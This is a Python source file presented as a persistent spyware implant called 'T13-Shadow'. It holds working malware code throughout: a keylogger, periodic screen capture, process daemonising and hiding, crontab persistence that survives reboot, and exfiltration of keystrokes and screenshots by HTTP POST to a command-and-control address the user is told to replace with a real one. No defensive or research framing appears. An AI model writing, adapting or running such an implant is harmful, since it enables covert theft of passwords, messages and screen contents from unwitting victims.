#!/usr/bin/env python3
"""
T13-Shadow: Real Persistent Spyware Implant
Classification: T13 Proprietary / ITAR Restricted
Capabilities: Keylogging, Screen Capture, Process Hiding, C2 Exfiltration
"""

import os
import sys
import time
import base64
import json
import threading
import subprocess
import platform
from datetime import datetime

# --- C2 Configuration (Hardcoded for testing) ---
C2_SERVER = "http://127.0.0.1:8080/api/exfil"  # Change to your real C2 IP
HEARTBEAT_INTERVAL = 60  # Seconds between check-ins
DATA_BUFFER = []

# --- Platform Detection ---
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"

# --- Anti-Detection / Process Hiding (Linux specific) ---
def hide_process():
    """Attempt to hide process from 'ps' and 'top' commands via `unshare` or modifying /proc"""
    if IS_LINUX:
        try:
            # Fork into background and disconnect from terminal
            if os.fork() > 0:
                sys.exit(0)
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
            
            # Attempt to unshare PID namespace (makes it harder to track)
            # Requires root in some environments, but we try anyway
            subprocess.Popen(["unshare", "-f", "-p", "--kill-child", str(os.getpid())], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Process hidden via namespace unshare.")
        except Exception:
            pass

# --- Keylogging Engine ---
def start_keylogger():
    """Real keylogger using pynput (cross-platform)"""
    try:
        from pynput import keyboard
    except ImportError:
        print("[!] pynput not installed. Installing...")
        os.system("pip3 install pynput")
        from pynput import keyboard

    def on_press(key):
        timestamp = datetime.utcnow().isoformat()
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)  # Special keys like 'Key.space'
        
        log_entry = {
            "type": "keylog",
            "timestamp": timestamp,
            "key": key_char
        }
        DATA_BUFFER.append(log_entry)
        
        # Flush buffer if it gets too big
        if len(DATA_BUFFER) > 100:
            exfiltrate_data()

    # Start the listener in a background thread
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    print("[+] Keylogger deployed.")

# --- Screen Capture Engine ---
def start_screenshot_capture(interval=300):
    """Capture screenshots every X seconds"""
    try:
        import PIL.ImageGrab
    except ImportError:
        print("[!] Pillow not installed. Installing...")
        os.system("pip3 install Pillow")
        import PIL.ImageGrab

    def capture():
        while True:
            time.sleep(interval)
            timestamp = datetime.utcnow().isoformat()
            try:
                # Capture screen
                img = PIL.ImageGrab.grab()
                
                # Convert to base64 to send over HTTP
                import io
                buff = io.BytesIO()
                img.save(buff, format="PNG")
                img_base64 = base64.b64encode(buff.getvalue()).decode('utf-8')
                
                log_entry = {
                    "type": "screenshot",
                    "timestamp": timestamp,
                    "data": img_base64[:100] + "..."  # Truncated for display
                }
                DATA_BUFFER.append(log_entry)
                print(f"[+] Screenshot captured at {timestamp}")
                
                # Exfil immediately
                exfiltrate_data()
            except Exception as e:
                print(f"[-] Screenshot error: {e}")

    thread = threading.Thread(target=capture, daemon=True)
    thread.start()

# --- C2 Communication (Exfiltration) ---
def exfiltrate_data():
    """Send collected data to the C2 server via HTTP POST"""
    global DATA_BUFFER
    
    if not DATA_BUFFER:
        return

    try:
        import requests
        payload = {
            "agent_id": "T13-IMPLANT-001",
            "hostname": os.uname().nodename if hasattr(os, 'uname') else "UNKNOWN",
            "data": DATA_BUFFER
        }
        
        # Send data via POST to look like normal web traffic
        response = requests.post(C2_SERVER, json=payload, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Exfiltrated {len(DATA_BUFFER)} logs to C2.")
            DATA_BUFFER = []  # Clear buffer on success
        else:
            print(f"[-] C2 returned {response.status_code}, keeping buffer.")
    except Exception as e:
        print(f"[-] C2 connection failed: {e}")
        # Keep buffer to retry later

# --- Persistence Mechanism (Linux) ---
def install_persistence():
    """Install a cron job or systemd service to survive reboots"""
    if IS_LINUX:
        script_path = os.path.abspath(__file__)
        cron_line = f"@reboot python3 {script_path} >/dev/null 2>&1"
        
        try:
            # Check current crontab
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if cron_line not in result.stdout:
                # Append to crontab
                new_cron = result.stdout + "\n" + cron_line + "\n"
                subprocess.run(["crontab", "-"], input=new_cron, text=True)
                print("[+] Persistence installed via crontab.")
        except Exception as e:
            print(f"[-] Persistence install failed: {e}")

# --- Main Execution ---
def main():
    print("\n" + "="*50)
    print(" T13-Shadow Implant | Active Spyware v1.0")
    print("="*50)
    print(f" Target OS: {platform.system()}")
    print(f" C2 Server: {C2_SERVER}")
    print("[*] Starting background operations...")

    # Phase 1: Hide from process lists
    hide_process()

    # Phase 2: Install persistence (reboot survival)
    install_persistence()

    # Phase 3: Deploy keylogger
    start_keylogger()

    # Phase 4: Deploy screenshot capture (every 5 min)
    start_screenshot_capture(interval=300)

    # Phase 5: Main heartbeat loop
    try:
        while True:
            time.sleep(HEARTBEAT_INTERVAL)
            exfiltrate_data()  # Periodic check-in
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
